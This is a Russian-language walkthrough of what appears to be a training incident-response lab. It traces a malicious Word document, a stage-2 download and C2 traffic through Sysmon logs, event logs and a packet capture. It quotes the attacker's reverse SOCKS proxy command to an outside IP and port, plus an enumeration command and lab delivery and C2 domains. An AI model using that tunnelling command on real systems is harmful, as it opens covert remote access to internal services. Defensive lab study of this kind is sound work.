=====================================================================
* Intro *
*********

Цель этой комнаты — познакомить вас с процессом анализа журналов конечных точек и сетей из скомпрометированного актива.
В этом сценарии вам будет поручено стать одним из специалистов по реагированию на инциденты, которые будут сосредоточены на обработке и анализе захваченных артефактов скомпрометированной машины.
Следующие темы, будут рассмотренны в данном задании:
        
        -    Log Analysis (Анализ журнала)
        -    Event Correlation (Корреляция событий)

Набор инструментов, необходимый для этой задачи, ориентирован на анализ  Sysmon Logs, Windows Event Logs и Packet Capture.

Для анализа артефактов Windows, таких как Windows Event Logs и Sysmon logs, мы будем использовать следующие инструменты:

    -    EvtxEcmd
    -    Timeline Explorer
    -    SysmonView
    -    Event Viewer

Для анализа предоставленного packet capture мы будем использовать следующие инструменты:

    -   Wireshark
    -   Brim

*** Пути к каталогам и/или файла указанные в данном гайде соответсвуют тестовой комнате
    В рейльной жихни они будут другими
    И чтобы каждый раз не менять название путей/файлов, я оставлю ихи как есть

=====================================================================
* Start *
*********

Расследование будет разделено на 5 частей:

    -   Preparation
    -   Initial Access
    -   Discovery
    -   Privelege Escalation
    -   Actions on Objective

    +++++++++++++++
    + Preparation +
    +++++++++++++++

    Перед проведением расследования одним из самых важных шагов является сравнение артефактов по их хэшам.
    Обычной практикой является проверка того, соответствуют ли артефакты ожидаемым значениям.

    Мы можем получить хэши каждого артефакта, запустив Powershell из панели задач и выполнив следующие команды:

        Get-FileHash -Algorithm SHA256 ..\Desktop\Incident Files\capture.pcapng
        Get-FileHash -Algorithm SHA256 ..\Desktop\Incident Files\sysmon.evtx
        Get-FileHash -Algorithm SHA256 ..\Desktop\Incident Files\windows.evtx
    
    *** Ну или можно все одним разом

        Get-FileHash -Algorithm SHA256 ..\Desktop\Incident Files\*
    
    Также, крайне желательно сохранить хэши в какой-нибудь файл
    Будете ли вы сохранять какждый хэш в отдельный фал или все разом в один - ваш выбор
    Я предпочел сохранить все разов в csv файл

        Get-FileHash -Algorithm SHA256 .\* | Export-Csv -Path 'C:\Users\user\Desktop\Incident Files\256 HASHes\all-hashes.csv' -NoTypeInformation | Import-Csv -Path 'C:\Users\user\Desktop\Incident Files\256 HASHes\all-hashes.csv'
    
    Далее...
    Чтобы проанализировать предоставленные журналы, нам сначала нужно преобразовать журналы EVTX в CSV с помощью EvtxEcmd, а затем передать их в Timeline Explorer.

        C:\Tools\EvtxECmd\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\windows.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf windows.csv
        C:\Tools\EvtxECmd\EvtxECmd.exe -f 'C:\Users\user\Desktop\Incident Files\sysmon.evtx' --csv 'C:\Users\user\Desktop\Incident Files' --csvf sysmon.csv
    
    Для TimelineExplorer.exe мы можем загрузить экспортированный CSV-файл, выполнив следующие действия:
    *** Вы можете воспользоваться функцией поиска в правом верхнем углу, чтобы найти уникальную строку, которая может существовать в любом столбце.

        File > Open > Choose sysmon.csv from C:\Users\user\Desktop\Incident Files directory
    
    SysmonView....
    SysmonView — это инструмент на основе графического интерфейса Windows, который визуализирует журналы Sysmon.
    Перед использованием этого инструмента необходимо экспортировать содержимое файла журнала в XML через Event Viewer.
    Для этого открываем любой журнал evtx (двойным нажатием на нем) и потом сохранем его, но уже в формале XML

    После этой процедуры, можем запускать утилиту SysmonView и импортировать в нее преобрахованный в XML журнал:

        i)      Go to File > Import Sysmon Event Logs then choose the XML files generated using the Event Viewer
        ii)     После загрузки левая боковая панель имеет функцию поиска, которая может фильтровать определенный процесс.
        iii)    Выберите путь к изображению и GUID сеанса для визуализации сопоставленного представления.

    ++++++++++++++++++
    + Initial Access +
    ++++++++++++++++++

    В этом инциденте вы будете действовать как оперативник по инциденту из оповещения, обработанного одним из аналитиков вашего центра безопасности.
    Аналитик подтвердил, что оповещение имеет КРИТИЧЕСКУЮ серьезность, которая требует дальнейшего расследования.

        //////////////////////////
        /// Malicious Document ///
        //////////////////////////

        Как сообщил аналитик SOC, вторжение началось с вредоносного документа.
        Кроме того, аналитик собрал основную информацию, сгенерированную оповещением, как указано ниже:

            -   Вредоносный документ имеет расширение .doc.
            -   Пользователь загрузил вредоносный документ через chrome.exe.
            -   Затем вредоносный документ выполнил цепочку команд для выполнения кода.
        
        Чтобы помочь в расследовании, вы можете обратиться к шпаргалке, созданной командой, применимой к этому сценарию:
        
            -   Начните с событий, сгенерированных Sysmon.
            -   EvtxEcmd, Timeline Explorer и SysmonView могут интерпретировать журналы Sysmon.
            -   Отслеживайте дочерние процессы WinWord.exe.
            -   Используйте фильтры, такие как ParentProcessID или ProcessID, чтобы сопоставить связь каждого процесса.
            -   Можете сосредоточиться на событиях Sysmon, таких как Process Creation (Event ID 1) и DNS Queries (Event ID 22), чтобы сопоставить активность, генерируемую вредоносным документом.

        Значимые источники данных   -   Sysmon
        Используемые утилиты        -   Timeline Explorer и SysmonView

        Ответы на вопросы....
        В интренете полно гайдов, которые предоставят ответы на вопросы
        Я же опишу порядок действий, который можно выполнить, чтобы найти ответы

            1)  The user of this machine was compromised by a malicious document. What is the file name of the document?
                Пользователь этой машины был скомпрометирован вредоносным документом. Каково имя файла документа?

                What is the name of the compromised user and machine?
                Каково имя скомпрометированного пользователя и машины?

                What is the PID of the Microsoft Word process that opened the malicious document?
                Каков PID процесса Microsoft Word, открывшего вредоносный документ?

                    Для поиска ответов на эти 3 вопроса можно использовать как Timeline Explorer, так и SysmonView
                    Я же остановлюсб на Timeline Explorer, так как он потребует использования фильтрации

                    После загрузки нужного нам CSV файл (в н ашем примере это sysmon.csv), мы увидим огромное количество различных столбцов
                    Не все столбцы будут иметь адекватное название
                    Но по характеру содержания данного столбца, мы можем поределить какой тип данных он будет содержать

                    В правом верхнем углу заголовка стобца, можно увидить очень меленький значок "фильтра"
                    И если нажать на него, то он предоставит фильтрованное сожержание столбца, которой мы можем выбрать
                    Используя имеющиеся данные (документ .doc и приложение chrome.exe), мы можем отфильровать необходимые нам столбцы, чтобы получить нужную информацию
                    Не бойтесь экспереминтировать с фильтрацией
            
            2)  Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
                На основании журналов Sysmon, какой адрес IPv4 был разрешен вредоносным доменом, использованным в предыдущем вопросе?

                    Timeline Explorer...
                    Используя полученную информацию (username/mahine name, PID=496), так также то, что был запрос на определения домена/IP-адреса (address resolved)
                    Мы понимем, что нам надо добвить еще одни фильтр - DNS Query (это соответсвует Sysmon Event ID 22)

                    SysmonView...
                    Так как мы знаем, что вредоносный файл имеет расширение DOC, то скорее всего и запрос был посрдеством WINWORD.exe
                    Поэтому фильтруем все с использованием фильтра WINWORD.exe
                    И проверяем все найденные IP адреса
            
            3)  What is the base64 encoded string in the malicious payload executed by the document?
                Какова закодированная в base64 строка во вредоносной нагрузке, выполняемой документом?

                    Timeline Explorer...
                    Тут нам понадобиться Timeline Explorer
                    Используем полученные знания    -   username/mahine name
                    А так же подсказку из вопроса   -   base64 / payload / executed
                    Так как мы знаем, что нагрузка была закодирована через Base64 и вставлена в тело запроса, то искать мы будем в стобце "Executable Info"
                    Но, на этот раз мы прибешнем к кастомному фильтру, а именно укажем Base64 в строке поиска, которая разположена сразу под название столбца

        ///////////////////////////////////
        /// Malicious Document (part 2) ///
        ///////////////////////////////////

        На основе полученных результатов мы обнаружили, что есть выполнение этапа 2:

            -   Документ успешно выполнил закодированную команду base64.
            -   Расшифровка этой строки показывает точную цепочку команд, выполненную вредоносным документом.

        Со следующими открытиями мы можем снова обратиться к шпаргалке, чтобы продолжить расследование:

            -   Выполнение Autostart отражает explorer.exe как его родительский идентификатор процесса.
            -   Дочерние процессы explorer.exe в пределах временного интервала события могут быть значительными.
            -   Создание процесса (идентификатор события 1) и создание файла (идентификатор события 11), следующие за выполнением документа, стоит проверить.

        Значимые источники данных   -   Sysmon
        Используемые утилиты        -   Timeline Explorer // SysmonView // Wireshark

            4)  The malicious execution of the payload wrote a file on the system. What is the full target path of the payload?
                Вредоносное выполнение полезной нагрузки записало файл в системе. Каков полный целевой путь полезной нагрузки?

                    Ну тут все просто
                    Расшифровка нагрузки показали порядок и какие действия были ей сделаны
                    Нам лишь осталось поискать название файла, который был создан нашрузкой, в логах используя Timeline Explorer
            
            5)  The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
                Имплантированная полезная нагрузка выполняется, как только пользователь входит в систему. Какая команда выполняется при успешном входе скомпрометированного пользователя?

                    Timeline Explorer...
                    Как нам было сказано, что Autostart отражает explorer.exe
                    Значит нам надо фильтровать Paretn Process с использованием explorer.exe
                    А дальше проверям все, что есть в колонке "Executable Info"
            
            6)  Based on Sysmon logs, what is the SHA256 hash of the malicious binary downloaded for stage 2 execution?
                На основании журналов Sysmon, каков хэш SHA256 вредоносного двоичного файла, загруженного для выполнения на этапе 2?

                    Timeline Explorer...
                    Тут есть небольшая ловушка
                    Как мы выяснили, нагрузка делает запрос на скачивание файла с удаленного сервера
                    Так вот нам нужно найти ХЭШ самого файла, а не нагрузки
                    Так что глобально фильтруем по названию скачанного файла
                    Затем в колонке "Executable Info" ищем запись, где будет указано только расположение скачаного файла ("C:\Users\Public\Downloads\first.exe")
                    Ну и смотрим колонку со значениями хэшей
            
            7)  The stage 2 payload downloaded establishes a connection to a c2 server. What is the domain and port used by the attacker?
                Загруженная полезная нагрузка этапа 2 устанавливает соединение с сервером c2. Какой домен и порт использует злоумышленник?

                    Timeline Explorer + SysmonView // Wireshark...
                    Как мы уже поняли, файл "first.exe" эвляется неким вирусом/бэкдором и нам надо найти с кем он взаимодействет
                    Для этого глобано отфильтруем по нему
                    В результате мы видим, им был создан процесс ("C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks)
                    Также мы видим много "DNSEvent (DNS query)" от его имени направленные на определнные домен  -   "QueryName: resolvecyber.xyz"
                    Осталось выяснить порт
                    Тут нам поможет либо WireShark, либо SysmonView (по фильтру "first.exe")
        
        //////////////////////////////////
        /// Malicious Document Traffic ///
        //////////////////////////////////

        На основе собранных данных мы обнаружили, что злоумышленник удаленно извлек полезную нагрузку 2-го этапа:

            -   Мы обнаружили домен и IP-адрес, вызываемые вредоносным документом в журналах Sysmon.
            -   Есть еще один домен и IP-адрес, используемые полезной нагрузкой 2-го этапа, зарегистрированные из того же источника данных.

        Поскольку мы обнаружили артефакты, связанные с сетью, мы можем снова обратиться к нашей шпаргалке, которая фокусируется на анализе сетевого журнала:

            -   Теперь мы можем использовать Brim и Wireshark для расследования захвата пакетов.
            -   Найдите сетевые события, связанные с собранными доменами и IP-адресами.
            -   Пример фильтра Brim, который вы можете использовать для этого расследования: _path=="http" "<вредоносный домен>"

        Источники данных        -   Захват пакетов
        Используемые утилиты    -   Timeline Explorer // Brim // Wireshark

        8)  What is the URL of the malicious payload embedded in the document?
            Каков URL вредоносного содержимого, встроенного в документ?

            В процессе работы с Timeline Explorer мы обнаружили несколько скачаныз файлов:
                -   free_magicules.doc
                -   first.exe
                -   ch.exe
                -   spf.exe
            
            А также запросы к двум доменам:
                -   phishteam.xyz
                -   esolvecyber.xyz
            
            И если домен "esolvecyber.xyz" больше взаимодействовал как C2 сервера
            То домен "phishteam.xyz" использовался как файл-сервер для скачивание нагрузок/файла
            Так что проверям данный домен в Wireshark, а также добавляет фальтр  http.request.method == "GET" чтобы отсучь весь ненужный мусор

    +++++++++++++
    + Discovery +
    +++++++++++++

    На основе собранных данных мы обнаружили, что вредоносный двоичный файл постоянно использует трафик C2:

        -   Мы можем легко расшифровать закодированную строку в сетевом трафике.
        -   Трафик содержит команду и вывод, выполненные злоумышленником.

    Чтобы продолжить расследование, мы можем сосредоточиться на следующей информации:

        -   Find network and process events connecting to the malicious domain.
        -   Find network events that contain an encoded command.
        -   We can use Brim to filter all packets containing the encoded string.
        -   Look for endpoint enumeration commands since the attacker is already inside the machine.

    Кроме того, мы можем обратиться к нашей шпаргалке для Brim, чтобы быстро исследовать закодированный трафик с помощью следующих фильтров:

        -   Чтобы получить все HTTP-запросы, связанные с вредоносным трафиком C2: 
        
                _path=="http" "<replace domain>" id.resp_p==<replace port> | cut ts, host, id.resp_p, uri | sort ts

    Значимые источники данных   -   Packet Capture // Sysmon
    Используемые утилиты        -   Timeline Explorer // Brim 

        9)  The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
            Атакующий смог обнаружить конфиденциальный файл внутри машины пользователя. Какой пароль обнаружен в вышеупомянутом файле?

            Brim...
            Так как все пересылаемые команды были закодированые через Base64, то нам надо сперва выбрать пакеты, содержашие данные команды
            Затем отфильтровать весь мысор так, чтобы вывод состоял только из команд
            Какой именно утилитой вы будете пользоваться - Ваше дело, я остановился на Brim (хотя думаю и Wireshark тоже можно использовать)

            Чтобы выделить нужные пакеты была использована следующая команда

                _path=="http" "<replace domain>" | cut uri | sort

            Затем просто Edit > Select All > Ctrl+C
            И вставляем в любой текстовый редактор, где мы сможем избавиться от ненужного мусора, чтобы в дальгейшем посмотреть в CyberCheff, что они скрывают
        
        10) The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
            Затем злоумышленник перечислил список портов прослушивания внутри машины. Какой порт прослушивания может предоставить удаленную оболочку внутри машины?

            Исследовав переданные комнды мы обнаружили, что одна из них была

                netstat -ano -p tcp

            Просмотрев переданные результаты, мы видим множество портов, но нас интересует порт 5985!
            «Указывает порты, которые служба WinRM использует для HTTP или HTTPS. WinRM 2.0: порт HTTP по умолчанию — 5985. Порт HTTPS по умолчанию — 5986».

            !!! Надо лучше знать порты)))
        
        11) The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
            Затем злоумышленник установил обратный прокси-сервер socks для доступа к внутренним службам, размещенным внутри машины. Какую команду выполняет злоумышленник для установления соединения?

            Timeline Explorer...
            Исследование зашифрованных команд на не дало идей как был установлен reverse shell
            Поэтому проверяем другой длмен, используемый хакером    -   phishteam.xyz
            Фильтруем глобально по его значению и просматриваем результате
            Видим, что через данный домен было загружено несколько файлов
            Проверяем каждый файл через глабальный фильтр
            Наше внимание привлекает запись

                "C:\Users\benimaru\Downloads\ch.exe" client 167.71.199.191:8080 R:socks
            
            Дело в том, что адресс 167.71.xxx.xxx использовался для вздаимодействия с С2 сервером
            Делое предположением, что это то, что мы искали
        
        12) The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
            Затем злоумышленник использовал собранные учетные данные с машины. Исходя из последующего процесса после выполнения socks proxy, какую службу злоумышленник использовал для аутентификации?

            Ну тот две подсказки

                i)  Порт, который может предоставить удаленную оболочку внутри машины - 5985
                    Это порт для winrm службы
                
                ii) Если просмотреть хронологию событий, то после установки reverse shell была осуществленна команда whoami
                    Что дает право считать, что здлоумышленник проник на хост
                    Следовательно, анализируем службы, которые этому предшествовали -   wsmprovhost.exe
            
            Поиск гугл показывает взаимосвязь

    ++++++++++++++++++++++++
    + Privilege Escalation +
    ++++++++++++++++++++++++

    На основании собранных данных злоумышленник получил стабильную оболочку через обратный прокси-сервер socks.

    С этим мы можем сосредоточиться на следующих событиях сети и конечной точки:

        -   Look for events executed after the successful execution of the reverse socks proxy tool..
        -   Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.

    Важные источники данных -  Packet Capture // Sysmon

        





